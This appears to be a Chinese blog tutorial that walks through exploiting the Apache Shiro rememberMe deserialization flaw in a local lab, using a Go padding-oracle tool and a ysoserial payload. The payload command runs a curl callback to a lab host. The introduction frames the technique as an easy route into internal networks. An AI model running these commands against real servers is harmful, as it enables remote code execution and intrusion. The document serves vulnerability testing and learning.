## 前言

平时项目过程中如果遇到能跑出key和gadget的shiro，是进入内网的非常便捷的手段。而这种情况下我们利用的都是shiro-550这个漏洞。

最近看到一个该漏洞的利用工具，用go编写，支持爆破任务“断点续传”，故本文记录该工具的使用过程。

## 环境搭建

这里选择1.4.1版本进行漏洞测试：https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1

下载源码，在IDEA中打开，等待maven依赖下载编译完成（需提前准备好maven环境），使用编译好的`samples-web:war exploded`作为部署包，配置tomcat跑起来即可。其他环境部署可以参考这篇文章：https://www.cnblogs.com/backlion/p/14077791.html

部署成功，访问界面如下：

![](../Images/035bf2dee176d04e4619ce601c894279.png)

## 工具使用

工具下载地址：https://github.com/wabzsy/ShiroPaddingOracle

### 1\. 编译工具

```
go build main.go
```

![](../Images/b59eda26f5c2aa281a7918e0826305d7.png)

### 2\. 登录shiro we应用后台，获取rememberMe cookie

![](../Images/2f97b36ca613b5c57a95c964f061b1f0.png)

登录成功后，获取rememberMe cookie：

![](../Images/624f33df596a1f7503f953d9749db68c.png)

将其保存为`rememberMe.txt`。

### 3\. 生成反序列化payload

```
java -jar ysoserial.jar CommonsCollections1 "curl http://192.168.88.1:8888/aaa" > payload.ser
```

### 4\. 运行工具进行爆破

```
main.exe -u http://192.168.88.1:8080/samples\_web\_war\_exploded/ -p payload.ser -i rememberMe.txt
```

![](../Images/c3d9075db783b73368bb871a5a583d6d.png)

## 总结

该漏洞本身利用条件大，需要发送大量请求。同时会在目标服务器产生大量日志。
